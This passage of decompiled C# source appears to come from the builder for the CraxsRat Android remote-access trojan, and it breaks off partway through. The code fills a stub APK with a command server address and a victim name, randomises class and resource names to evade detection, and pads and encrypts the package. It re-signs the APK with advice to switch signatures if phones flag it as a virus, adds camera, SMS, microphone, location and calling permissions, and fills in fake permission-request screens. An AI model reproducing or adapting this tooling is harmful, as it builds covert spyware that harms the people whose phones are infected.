		this.N_trns_g_ = this.RandommMad(50, 80);
		this.NRequestPermissions = this.RandommMad(50, 80);
		this.N_engine_wrk_ = this.RandommMad(50, 80);
		this.N_skin_cls_ = this.RandommMad(50, 80);
		this.N_update_app_ = this.RandommMad(50, 80);
		this.N_callr_lsnr_ = this.RandommMad(50, 80);
		this.N_clss_loder_ = this.RandommMad(50, 80);
		this.N_excut_meth_ = this.RandommMad(50, 80);
		this.N_run_comnd_ = this.RandommMad(50, 80);
		this.N_get_me_fil_ = this.RandommMad(50, 80);
		this.NCommandsService = this.RandommMad(50, 80);
		this.payload = this.Randomunicode(50, 80);
		this.new_exit_mth = this.RandommMad(50, 80);
		this.new_wifipolc = this.RandommMad(50, 80);
		this.new_formatpacket = this.RandommMad(50, 80);
		this.new_dzip = this.RandommMad(50, 80);
		this.new_getbyte = this.RandommMad(50, 80);
		this.new_base_mth = this.RandommMad(50, 80);
		this.new_getstr = this.RandommMad(50, 80);
		this.new_czip = this.RandommMad(50, 80);
		this.new_inst = this.RandommMad(50, 80);
		this.new_strt_con_ = this.RandommMad(50, 80);
		this.new_fist_inf_ = this.RandommMad(50, 80);
		this.new_new_con_ = this.RandommMad(50, 80);
		this.new_send_it_ = this.RandommMad(50, 80);
		this.new_Reblace_ = this.RandommMad(50, 80);
		this.new_runn_srv_ = this.RandommMad(50, 80);
		this.NEWRANDOM = this.RandommMadv2(400, 1000);
	}

	// Token: 0x0600020D RID: 525 RVA: 0x0003D9BC File Offset: 0x0003BBBC
	public string Randomunicode(int minCharacters, int maxCharacters)
	{
		string text = "qQaAzZwWsSxXeEdDcCrRfFVvtTGgBbYyHhNnUuJjMmKiIkLoOlPp";
		if (this.rshit == null)
		{
			this.rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 = text2 + this.randmid[this.rnd.Next(0, this.randmid.Length)] + Conversions.ToString(text[this.rnd.Next(0, text.Length - 1)]);
			}
			this.cou++;
			return text2.ToString().ToLower() + Conversions.ToString(this.cou);
		}
	}

	// Token: 0x0600020E RID: 526 RVA: 0x0003DA68 File Offset: 0x0003BC68
	public string RandommClass(int minCharacters, int maxCharacters)
	{
		string text = "qQaAzZwWsSxXeEdDcCrRfFVvtTGgBbYyHhNnUuJjMmKiIkLoOlPp";
		this.rshit.Next(minCharacters, maxCharacters);
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 = text2 + this.randmid[this.rnd.Next(0, this.randmid.Length)] + Conversions.ToString(text[this.rnd.Next(0, text.Length - 1)]);
			}
			this.cou++;
			return text2.ToString().ToLower() + Conversions.ToString(this.cou);
		}
	}

	// Token: 0x0600020F RID: 527 RVA: 0x0003DB08 File Offset: 0x0003BD08
	public string RandommMadv2(int minCharacters, int maxCharacters)
	{
		string text = "QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp";
		if (this.rshit == null)
		{
			this.rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 += Conversions.ToString(text[this.rnd.Next(0, text.Length - 1)]);
			}
			this.cou++;
			return text2.ToString().ToLower() + Conversions.ToString(this.cou);
		}
	}

	// Token: 0x06000210 RID: 528 RVA: 0x0003DB08 File Offset: 0x0003BD08
	public string RandommMad(int minCharacters, int maxCharacters)
	{
		string text = "QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp";
		if (this.rshit == null)
		{
			this.rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 += Conversions.ToString(text[this.rnd.Next(0, text.Length - 1)]);
			}
			this.cou++;
			return text2.ToString().ToLower() + Conversions.ToString(this.cou);
		}
	}

	// Token: 0x06000211 RID: 529 RVA: 0x0003DB98 File Offset: 0x0003BD98
	private string FixStrings(string str)
	{
		string text = "&";
		string text2 = "&amp;";
		string text3 = "<";
		string text4 = "&lt;";
		string text5 = "\"";
		string text6 = "\\\"";
		string text7 = "'";
		string text8 = "\\'";
		string text9 = "?";
		string text10 = "\\?";
		string text11 = "@";
		string text12 = "\\@";
		if (str.Contains(text) && !str.Contains(text2))
		{
			str = str.Replace(text, text2);
		}
		if (str.Contains(text3) && !str.Contains(text4))
		{
			str = str.Replace(text3, text4);
		}
		if (str.Contains(text5) && !str.Contains(text6))
		{
			str = str.Replace(text5, text6);
		}
		if (str.Contains(text7) && !str.Contains(text8))
		{
			str = str.Replace(text7, text8);
		}
		if (str.Contains(text9) && !str.Contains(text10))
		{
			str = str.Replace(text9, text10);
		}
		if (str.Contains(text11) && !str.Contains(text12))
		{
			str = str.Replace(text11, text12);
		}
		return str;
	}

	// Token: 0x06000212 RID: 530 RVA: 0x0003DCD8 File Offset: 0x0003BED8
	private void StartWork(string final)
	{
		this.KillA(true);
		if (Operators.CompareString(final, null, false) != 0)
		{
			this.cou = 1;
			string[] array = final.Split(new string[]
			{
				this.spl_arguments
			}, StringSplitOptions.None);
			this.ip = array[0];
			this.ports = array[1];
			this.namevictim = this.FixStrings(array[2]);
			this.namepatch = this.FixStrings(array[3]);
			this.version = array[4];
			string[] array2 = array[5].Split(new char[]
			{
				':'
			});
			this.proprty = array2[0];
			this.KEY = array2[1];
			this.sleepms = array[6];
			this.futex = array[7];
			this.path_apktool = array[8];
			this.path_font = array[10];
			this.flavor = array[11];
			string[] array3 = array[12].Split(new char[]
			{
				'|'
			});
			array3[0].Split(new char[]
			{
				','
			});
			array3[1].Split(new char[]
			{
				','
			});
			this.iconPatch = array[13];
			if (File.Exists(this.iconPatch))
			{
				this._Bitmap_ICO = (Bitmap)Codes.ResizeImage(new Bitmap(this.iconPatch), new Size(144, 144), false);
			}
			this.BIND_Path = array[16];
			this.BIND_EX = array[17];
			this.intent_ = this.FixStrings(array[18]);
			this.xPackage = array[19];
			if (this.xPackage.Contains("."))
			{
				string[] array4 = this.xPackage.Split(new char[]
				{
					'.'
				});
				this.pack1 = array4[0];
				this.pack2 = array4[1];
				this.Nactivz = this.RandommMad(50, 60);
				this.Nservziz = this.RandommMad(50, 60);
				this.Ntolziz = this.RandommMad(50, 60);
				this.Nbrodatz = this.RandommMad(50, 60);
			}
			this.EncryRando();
			this.EncryRandoreso();
			this.EncryRando_app_reso();
			this.EncryRando_drawable();
			this.EncryRando_webXML();
			this.EncryRando_notifiXML();
			string left = array[14];
			if (Operators.CompareString(left, "Bold", false) != 0 && Operators.CompareString(left, "Regular", false) == 0)
			{
			}
			Conversions.ToInteger(array[15]);
			this.LogB("Starting...\r\n----------");
			new Thread(new ThreadStart(this.Step1))
			{
				IsBackground = true
			}.Start();
		}
	}

	// Token: 0x06000213 RID: 531 RVA: 0x0003DF58 File Offset: 0x0003C158
	public static void DeleteDirectory(string target_dir)
	{
		string[] files = Directory.GetFiles(target_dir);
		string[] directories = Directory.GetDirectories(target_dir);
		string[] array = files;
		foreach (string path in array)
		{
			File.SetAttributes(path, FileAttributes.Normal);
			File.Delete(path);
		}
		string[] array3 = directories;
		foreach (string target_dir2 in array3)
		{
			Build.DeleteDirectory(target_dir2);
		}
		Directory.Delete(target_dir, false);
	}

	// Token: 0x06000214 RID: 532 RVA: 0x0003DFD4 File Offset: 0x0003C1D4
	private void Step1()
	{
		string driv = Codes.GetDriv();
		Thread.Sleep(this._Time);
		this.folder_building = driv + "CraxsRat_Bilder";
		if (Environment.Is64BitOperatingSystem)
		{
			this.folder_apktool = this.folder_building + "\\platformBinary64\\bin";
		}
		else
		{
			this.folder_apktool = this.folder_building + "\\platformBinary32\\bin";
		}
		try
		{
			if (Directory.Exists(this.folder_building) & this.oncedelete)
			{
				this.oncedelete = false;
				this.LogB("Deleting old Files...");
				this.LogB("Please Wait...");
				Codes.DirectoryDeleteLong(this.folder_building);
			}
		}
		catch (Exception ex)
		{
			Exception ex2 = ex;
			this.LogB("File delete old" + ex2.Message);
		}
		try
		{
			for (;;)
			{
				if (Directory.Exists(this.folder_building))
				{
					this.vulTrack = 20;
					if (Directory.Exists(this.folder_apktool))
					{
						break;
					}
					Directory.CreateDirectory(this.folder_apktool);
				}
				else
				{
					Directory.CreateDirectory(this.folder_building);
				}
			}
			this.vulTrack = 30;
			if (Directory.Exists(this.folder_apktool))
			{
				try
				{
					if (Directory.GetFiles(this.folder_apktool, "*.*").Count<string>() == 0)
					{
						this.LogB("Extracting New Files...");
						Codes.File_zip_Decompress(this.path_apktool, this.folder_building);
					}
				}
				catch (Exception)
				{
				}
			}
			this.vulTrack = 35;
			for (;;)
			{
				Thread.Sleep(this._Time);
				this.LogB("Read Configuration...");
				if (!(Directory.Exists(this.folder_building) & Directory.Exists(this.folder_apktool)))
				{
					break;
				}
				try
				{
					string path = this.folder_apktool + "\\temp";
					if (Directory.Exists(this.folder_apktool + "\\temp"))
					{
						Directory.Delete(path, true);
					}
					if (File.Exists(this.folder_apktool + "\\temp.apk"))
					{
						File.Delete(this.folder_apktool + "\\temp.apk");
					}
					if (File.Exists(this.folder_apktool + "\\output\\ready.apk"))
					{
						File.Delete(this.folder_apktool + "\\output\\ready.apk");
					}
					if (Operators.CompareString(this.HIDETYPE, "TEN", false) == 0)
					{
						File.WriteAllBytes(this.folder_apktool + "\\temp.apk", Resources.MYSTUBTEN);
					}
					else
					{
						File.WriteAllBytes(this.folder_apktool + "\\temp.apk", Resources.MYSTUB);
					}
					if (this.CMD_running())
					{
						this.vulTrack = 40;
						NewLateBinding.LateCall(NewLateBinding.LateGet(this.CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
						{
							"cd " + this.folder_apktool
						}, null, null, null, true);
						NewLateBinding.LateCall(NewLateBinding.LateGet(this.CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
						{
							"java -version"
						}, null, null, null, true);
						this.LogB("Working...");
					}
					break;
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
			base.Close();
		}
	}

	// Token: 0x06000215 RID: 533 RVA: 0x0003E354 File Offset: 0x0003C554
	private bool CMD_running()
	{
		bool result;
		try
		{
			this.CMD = new Process();
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.CMD, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardOutput", new object[]
			{
				true
			}, null, null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.CMD, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardInput", new object[]
			{
				true
			}, null, null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.CMD, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardError", new object[]
			{
				true
			}, null, null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.CMD, null, "StartInfo", new object[0], null, null, null), null, "FileName", new object[]
			{
				"cmd.exe"
			}, null, null, false, true);
			((Process)this.CMD).OutputDataReceived += new DataReceivedEventHandler(this.Sync_Output);
			((Process)this.CMD).ErrorDataReceived += new DataReceivedEventHandler(this.Sync_Output);
			((Process)this.CMD).Exited += delegate(object a0, EventArgs a1)
			{
				this.ex();
			};
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.CMD, null, "StartInfo", new object[0], null, null, null), null, "UseShellExecute", new object[]
			{
				false
			}, null, null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.CMD, null, "StartInfo", new object[0], null, null, null), null, "CreateNoWindow", new object[]
			{
				true
			}, null, null, false, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.CMD, null, "StartInfo", new object[0], null, null, null), null, "WindowStyle", new object[]
			{
				ProcessWindowStyle.Hidden
			}, null, null, false, true);
			NewLateBinding.LateSet(this.CMD, null, "EnableRaisingEvents", new object[]
			{
				true
			}, null, null);
			NewLateBinding.LateCall(this.CMD, null, "Start", new object[0], null, null, null, true);
			NewLateBinding.LateCall(this.CMD, null, "BeginOutputReadLine", new object[0], null, null, null, true);
			NewLateBinding.LateCall(this.CMD, null, "BeginErrorReadLine", new object[0], null, null, null, true);
			result = true;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000216 RID: 534 RVA: 0x0003E5E4 File Offset: 0x0003C7E4
	public void Sync_Output(object d01, object b01)
	{
		try
		{
			if (base.InvokeRequired)
			{
				Build.Delegate0 method = new Build.Delegate0(this.Sync_Output);
				base.Invoke(method, new object[]
				{
					d01,
					b01
				});
			}
			else if (!string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null))))
			{
				Thread.Sleep(1);
				if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("OpenJDK"))
				{
					if (!this.Once)
					{
						NewLateBinding.LateCall(NewLateBinding.LateGet(this.CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
						{
							"apktool d temp.apk"
						}, null, null, null, true);
						this.Once = true;
					}
				}
				else if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar SignApk.jar") | NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar " + this.folder_apktool + "\\SignApk.jar "))
				{
					this.Step3();
				}
				else if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("Copying original files"))
				{
					new Thread(new ThreadStart(this.Step2))
					{
						IsBackground = true
					}.Start();
				}
				else if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("Built apk"))
				{
					int num = -1;
					for (;;)
					{
						try
						{
							int num2 = num;
							int num3 = num2;
							if (num3 != 545)
							{
								this.CheckFakeSize.Checked = true;
								if ((this.pumpfinished && this.pumpstarted) || this.firstpump)
								{
									break;
								}
								if (this.CheckBIND.Checked)
								{
									this.TextSize.Text = "1";
								}
								this.firstpump = true;
							}
							for (;;)
							{
								string path = this.folder_apktool + "\\temp\\build\\apk\\res\\drawable-xxxhdpi\\freespace.png";
								if (File.Exists(path))
								{
									break;
								}
								Thread.Sleep(this._Time);
							}
							this.NewFakeSize = Conversions.ToInteger(this.TextSize.Text);
							for (;;)
							{
								if (this.pumpstarted)
								{
									if (this.pumpfinished)
									{
										break;
									}
									Thread.Sleep(1000);
								}
								else
								{
									if (File.Exists(this.folder_apktool + "\\temp\\dist\\temp.apk"))
									{
										File.Delete(this.folder_apktool + "\\temp\\dist\\temp.apk");
									}
									this.LogB("Resize Apk");
									this.pumpstarted = true;
									this.Pumper(checked(this.NewFakeSize * 1000));
									Thread.Sleep(1000);
								}
							}
							NewLateBinding.LateCall(NewLateBinding.LateGet(this.CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
							{
								"apktool b temp"
							}, null, null, null, true);
							this.LogB("Rebuild apk");
							goto IL_74B;
						}
						catch (Exception)
						{
							Thread.Sleep(this._Time);
							num = 545;
						}
					}
					string text;
					for (;;)
					{
						if (File.Exists(this.folder_apktool + "\\temp\\dist\\temp.apk"))
						{
							text = "";
							if (this.checkprotector.Checked)
							{
								text = "_protected";
								for (;;)
								{
									if (this.encrypt_started)
									{
										if (!(!File.Exists(this.folder_apktool + "\\temp\\dist\\temp_protected.apk") | !this.protectfinished))
										{
											break;
										}
										Thread.Sleep(1000);
										Application.DoEvents();
									}
									else
									{
										this.encrypt_started = true;
										this.LogB(" Encryption V2...");
										File.WriteAllBytes(this.folder_apktool + "\\temp\\dist\\Crypt.jar", Resources.APKEditor);
										string text2 = "java -jar temp\\dist\\Crypt.jar p -i \"" + this.folder_apktool + "\\temp\\dist\\temp.apk\"";
										object instance = NewLateBinding.LateGet(this.CMD, null, "StandardInput", new object[0], null, null, null);
										object[] array = new object[]
										{
											text2
										};
										object[] array2 = array;
										bool[] array3 = new bool[]
										{
											true
										};
										bool[] array4 = array3;
										NewLateBinding.LateCall(instance, null, "WriteLine", array, null, null, array3, true);
										if (array4[0])
										{
											text2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
										}
									}
								}
							}
							if (this.StartedZip)
							{
								break;
							}
							if (!this.StartedZip)
							{
								NewLateBinding.LateCall(NewLateBinding.LateGet(this.CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
								{
									string.Concat(new string[]
									{
										"zipalign.exe -v 4 ",
										this.folder_apktool,
										"\\temp\\dist\\temp",
										text,
										".apk ",
										this.folder_apktool,
										"\\temp\\dist\\tempzip.apk "
									})
								}, null, null, null, true);
								this.LogB(" Verification...");
								this.StartedZip = true;
							}
							Thread.Sleep(5000);
						}
						else
						{
							Thread.Sleep(5000);
							this.LogB("Wating...");
						}
					}
					this.LogB("Apk Signing...");
					File.Delete(this.folder_apktool + "\\certificate.pem");
					File.Delete(this.folder_apktool + "\\key.pk8");
					string text3 = "if the App detected as virus on the phone , try change signature version";
					string language = RegistryHandler.Get_Language();
					text3 = ((Operators.CompareString(language, "AR", false) == 0) ? ("\r\n<------->\r\n" + Codes.Translate(text3, "en", "ar") + "\r\n<------->") : ((Operators.CompareString(language, "CN", false) == 0) ? ("\r\n<------->\r\n" + Codes.Translate(text3, "en", "zh") + "\r\n<------->") : ("\r\n<------->\r\n" + text3 + "\r\n<------->")));
					if (Operators.CompareString(this.checksignver.Text, "V1", false) == 0)
					{
						this.LogB("signature V1...");
						File.WriteAllBytes(this.folder_apktool + "\\certificate.pem", Resources.c);
						File.WriteAllBytes(this.folder_apktool + "\\key.pk8", Resources.k);
					}
					else
					{
						this.LogB("signature V2...");
						File.WriteAllBytes(this.folder_apktool + "\\certificate.pem", Resources.C2);
						File.WriteAllBytes(this.folder_apktool + "\\key.pk8", Resources.K2);
					}
					this.LogB(text3);
					NewLateBinding.LateCall(NewLateBinding.LateGet(this.CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
					{
						string.Concat(new string[]
						{
							"java -jar ",
							this.folder_apktool,
							"\\SignApk.jar sign --key ",
							this.folder_apktool,
							"\\key.pk8 --cert ",
							this.folder_apktool,
							"\\certificate.pem  --v2-signing-enabled true --v3-signing-enabled true --out ",
							this.folder_apktool,
							"\\output\\ready.apk ",
							this.folder_apktool,
							"\\temp\\dist\\temp",
							text,
							".apk "
						})
					}, null, null, null, true);
					this.FolderApk = true;
				}
				IL_74B:
				if (!this.FolderApk)
				{
					string text4 = NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString();
					if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("[PROTECT] Saved to"))
					{
						this.protectfinished = true;
					}
					if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().StartsWith("I:"))
					{
						this.LogB(text4.Replace("I:", ""));
					}
					else if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("[PROTECT]") && !NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("Writing:"))
					{
						this.LogB(text4);
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000217 RID: 535 RVA: 0x0003EE68 File Offset: 0x0003D068
	public void Pumper(int NewSize)
	{
		try
		{
			double num = Conversion.Val(NewSize);
			num *= 1024.0;
			string str = this.Randomunicode(5, 15);
			string text = Path.GetTempPath() + "\\" + str + ".png";
			Resources.low.Save(text);
			FileStream fileStream = File.OpenWrite(text);
			long num2 = fileStream.Seek(0L, SeekOrigin.End);
			bool flag = false;
			checked
			{
				while ((double)num2 < num)
				{
					if (flag)
					{
						flag = false;
						fileStream.WriteByte(0);
					}
					else
					{
						flag = true;
						fileStream.WriteByte(1);
					}
					num2 += 1L;
				}
				fileStream.Close();
				string text2 = this.folder_apktool + "\\temp\\res\\drawable-xxxhdpi\\freespace.png";
				if (File.Exists(text2))
				{
					File.Delete(text2);
				}
				File.Move(text, text2);
			}
		}
		catch (Exception ex)
		{
			Exception ex2 = ex;
			Interaction.MsgBox("Resize apk error 1 " + ex2.Message, MsgBoxStyle.OkOnly, null);
		}
		try
		{
			double num3 = Conversion.Val(NewSize);
			num3 *= 1024.0;
			string str2 = this.Randomunicode(5, 15);
			string text3 = Path.GetTempPath() + "\\" + str2 + ".png";
			Resources.low.Save(text3);
			FileStream fileStream2 = File.OpenWrite(text3);
			long num4 = fileStream2.Seek(0L, SeekOrigin.End);
			bool flag2 = false;
			checked
			{
				while ((double)num4 < num3)
				{
					if (flag2)
					{
						flag2 = false;
						fileStream2.WriteByte(0);
					}
					else
					{
						flag2 = true;
						fileStream2.WriteByte(1);
					}
					num4 += 1L;
				}
				fileStream2.Close();
				string text4 = this.folder_apktool + "\\temp\\build\\apk\\res\\drawable-xxxhdpi\\freespace.png";
				if (File.Exists(text4))
				{
					File.Delete(text4);
				}
				File.Move(text3, text4);
			}
		}
		catch (Exception ex3)
		{
			Exception ex4 = ex3;
			Interaction.MsgBox("Resize apk error 2 " + ex4.Message, MsgBoxStyle.OkOnly, null);
		}
		this.pumpfinished = true;
	}

	// Token: 0x06000218 RID: 536 RVA: 0x0003F080 File Offset: 0x0003D280
	[DebuggerStepThrough]
	private void Step3()
	{
		Build.VB_0024StateMachine_882_Step3 vb_0024StateMachine_882_Step = new Build.VB_0024StateMachine_882_Step3();
		vb_0024StateMachine_882_Step._0024VB_0024Me = this;
		vb_0024StateMachine_882_Step._0024State = -1;
		vb_0024StateMachine_882_Step._0024Builder = AsyncVoidMethodBuilder.Create();
		vb_0024StateMachine_882_Step._0024Builder.Start<Build.VB_0024StateMachine_882_Step3>(ref vb_0024StateMachine_882_Step);
	}

	// Token: 0x06000219 RID: 537 RVA: 0x0003F0BC File Offset: 0x0003D2BC
	private void OKY()
	{
		checked
		{
			if (this.FolderApk)
			{
				int num = 0;
				do
				{
					Thread.Sleep(1000);
					num++;
				}
				while (num <= 5);
				Process.Start(this.folder_apktool + "\\output");
			}
		}
	}

	// Token: 0x0600021A RID: 538 RVA: 0x0003F100 File Offset: 0x0003D300
	private void Step2()
	{
		checked
		{
			for (;;)
			{
				Thread.Sleep(this._Time);
				string path = this.folder_apktool + "\\temp\\res\\values\\strings.xml";
				string path2 = this.folder_apktool + "\\temp\\res\\values\\public.xml";
				if (!File.Exists(reso.Junkpath))
				{
					File.WriteAllBytes(reso.Junkpath, Resources.junk);
				}
				string text = File.ReadAllText(reso.Junkpath);
				try
				{
					if (!File.Exists(path2))
					{
						Thread.Sleep(this._Time);
						continue;
					}
					string contents = File.ReadAllText(path2).Replace(Resources.GSTART, " ");
					File.Delete(path2);
					File.WriteAllText(path2, contents);
				}
				catch (Exception)
				{
					Thread.Sleep(this._Time);
					continue;
				}
				string path3 = this.folder_apktool + "\\temp\\apktool.yml";
				string path4 = this.folder_apktool + "\\temp\\AndroidManifest.xml";
				string path5 = this.folder_apktool + "\\temp\\res\\values\\public.xml";
				string text2 = this.folder_apktool + "\\temp\\res\\layout\\q1q2q3q4q5q6.xml";
				string text3 = this.folder_apktool + "\\temp\\res\\layout\\s1s2s3s4s5s6.xml";
				string path6 = this.folder_apktool + "\\temp\\res\\xml\\prov_path.xml";
				try
				{
					if (!File.Exists(path6))
					{
						Thread.Sleep(this._Time);
						continue;
					}
					string text4 = File.ReadAllText(path6);
					File.WriteAllText(path6, text4.Replace("suffix", this.flavor).Replace("spymax", this.pack1).Replace("stub7", this.pack2));
				}
				catch (Exception)
				{
					Thread.Sleep(this._Time);
					continue;
				}
				if (File.Exists(path))
				{
					string path7 = this.folder_apktool + "\\temp\\res\\layout\\activity_req_access.xml";
					while (!File.Exists(path7))
					{
						Thread.Sleep(this._Time);
					}
					string contents2 = File.ReadAllText(path7).Replace("[LOG-TITLE]", this.logtitletext.Text).Replace("[MY-NAME]", this.namepatch).Replace("[LOG-BODY]", this.logbodytext.Text.Replace("\r\n", "\\n")).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("[LOG-BTN]", this.logbtntext.Text);
					File.WriteAllText(path7, contents2);
					string path8 = this.folder_apktool + "\\temp\\res\\layout\\updateview.xml";
					while (!File.Exists(path8))
					{
						Thread.Sleep(this._Time);
					}
					string contents3 = File.ReadAllText(path8).Replace("[MY-NAME]", this.bindCtitle.Text).Replace("[INST-BODY]", this.bindbodytext.Text.Replace("\r\n", "\\n")).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("[INST-BTN]", this.bndbtntext.Text);
					File.WriteAllText(path8, contents3);
					string path9 = this.folder_apktool + "\\temp\\res\\layout\\loading.xml";
					while (!File.Exists(path9))
					{
						Thread.Sleep(this._Time);
					}
					string contents4 = File.ReadAllText(path9).Replace("[MY-NAME]", this.namepatch).Replace("d1d2d3d4d5d6", this.Ndraw_ico);
					File.WriteAllText(path9, contents4);
					string path10 = this.folder_apktool + "\\temp\\res\\xml\\accessdiecrip.xml";
					while (!File.Exists(path10))
					{
						Thread.Sleep(this._Time);
					}
					string contents5 = File.ReadAllText(path10).Replace("suffix", this.flavor).Replace("spymax", this.pack1).Replace("stub7", this.pack2).Replace("activz", this.Nactivz).Replace("servziz", this.Nservziz).Replace("ClassGen12", this.NClassGen12);
					File.WriteAllText(path10, contents5);
					this.vulTrack = 50;
					if (this.rnd == null)
					{
						this.rnd = new Random();
					}
					try
					{
						string text5 = "";
						int num = 1;
						do
						{
							text5 = string.Concat(new string[]
							{
								text5,
								"    <string name=\"",
								this.randmid[this.rnd.Next(0, this.randmid.Length)],
								this.RandommClass(10, 15),
								"\">",
								this.randmid[this.rnd.Next(0, this.randmid.Length)],
								this.RandommMad(25, 50),
								"</string>\r\n"
							});
							num++;
						}
						while (num <= 450);
						string contents6 = File.ReadAllText(path).Replace(Resources.GRESSTR, text5).Replace("[CYPHER_VICTIM]", this.namevictim).Replace("[CYPHER_PATCH]", this.namepatch).Replace("CYPHER_PATCH", this.namepatch).Replace("[CYPHER_VERSION]", this.version).Replace("[CYPHER_PROPERTY]", this.proprty).Replace("[CYPHER_SLEEP]", this.sleepms).Replace("[CYPHER_BIND]", this.BIND_EX).Replace("[DISCRIP]", this.dscriptext.Text).Replace("[CYPHER_PERMI]", this.PRIMS).Replace("j1j2j3j4j5j6", this.NresoString0).Replace("c1c2c3c4c5c6", this.NresoString1).Replace("z1z2z3z4z5z6", this.NresoString2).Replace("f1f2f3f4f5f6", this.NresoString3).Replace("h1h2h3h4h5h6", this.NresoString4).Replace("t1t2t3t4t5t6", this.NresoString5).Replace("n1n2n3n4n5n6", this.NresoString6).Replace("i1i2i3i4i5i6", this.NresoString7).Replace("k1k2k3k4k5k6", this.NresoString8).Replace("o1o2o3o4o5o6", this.NresoString9).Replace("u1u2u3u4u5u6", this.NresoString10).Replace("e1e2e3e4e5e6", this.NresoString11).Replace("y1y2y3y4y5y6", this.NresoString12).Replace("b1b2b3b4b5b6", this.Napp_reso0).Replace("d1d2d3d4d5d6", this.Ndraw_ico).Replace("x1x2x3x4x5x6", this.Ndraw_notifi).Replace("q1q2q3q4q5q6", this.NwebXML).Replace("s1s2s3s4s5s6", this.NnotifiXML);
						File.WriteAllText(path, contents6);
						this.vulTrack = 60;
						for (;;)
						{
							Thread.Sleep(this._Time);
							if (File.Exists(path3))
							{
								try
								{
									string contents7 = File.ReadAllText(path3).Replace("3.31.165", this.version).Replace("818", this.APKVERSION).Replace("331165", this.version.Replace(".", ""));
									File.WriteAllText(path3, contents7);
									break;
								}
								catch (Exception)
								{
									Thread.Sleep(this._Time);
									continue;
								}
							}
							Thread.Sleep(this._Time);
						}
						this.vulTrack = 65;
						for (;;)
						{
							Thread.Sleep(this._Time);
							if (File.Exists(path4))
							{
								break;
							}
							Thread.Sleep(this._Time);
						}
						if (this.checkcatpure.Checked)
						{
							this.MonitorPack = "";
							if (this.listmonitor.Items.Count > 0)
							{
								foreach (object obj in this.listmonitor.Items)
								{
									object objectValue = RuntimeHelpers.GetObjectValue(obj);
									ref string ptr = ref this.MonitorPack;
									ptr = Conversions.ToString(Operators.AddObject(ptr, Operators.AddObject(objectValue, "!")));
								}
							}
						}
						string text6 = "";
						if (this.Primslist.Items.Count > 0)
						{
							foreach (object value in this.Primslist.Items)
							{
								string text7 = Conversions.ToString(value);
								try
								{
									string text8 = text7;
									string text9 = text8;
									if (text9 != null)
									{
										switch (text9.Length)
										{
										case 6:
											if (text9 == "Camera")
											{
												this.Prim_camera = "android.permission.CAMERA";
												text6 += "    <uses-permission android:name=\"android.permission.CAMERA\"  />\r\n";
											}
											break;
										case 8:
										{
											char c = text9[0];
											if (c != 'L')
											{
												if (c != 'R')
												{
													if (c == 'S')
													{
														if (text9 == "Send SMS")
														{
															this.Prim_sendsms = "android.permission.SEND_SMS";
															text6 += "    <uses-permission android:name=\"android.permission.SEND_SMS\" />\r\n";
														}
													}
												}
												else if (text9 == "Read SMS")
												{
													this.Prim_readsms = "android.permission.READ_SMS";
													text6 += "    <uses-permission android:name=\"android.permission.READ_SMS\" />\r\n";
												}
											}
											else if (text9 == "Location")
											{
												this.Prim_loacation1 = "android.permission.ACCESS_COARSE_LOCATION";
												this.Prim_loacation2 = "android.permission.ACCESS_FINE_LOCATION";
												this.Prim_loacation3 = "no";
												text6 += "    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" />\r\n";
												text6 += "    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"  />\r\n";
											}
											break;
										}
										case 10:
										{
											char c = text9[1];
											if (c != 'a')
											{
												if (c == 'i')
												{
													if (text9 == "Microphone")
													{
														this.Prim_microphone = "android.permission.RECORD_AUDIO";
														text6 += "    <uses-permission android:name=\"android.permission.RECORD_AUDIO\" />\r\n";
													}
												}
											}
											else if (text9 == "Make Calls")
											{
												text6 += "    <uses-permission android:name=\"android.permission.CALL_PHONE\" />\r\n";
												this.Prim_callphone = "android.permission.CALL_PHONE";
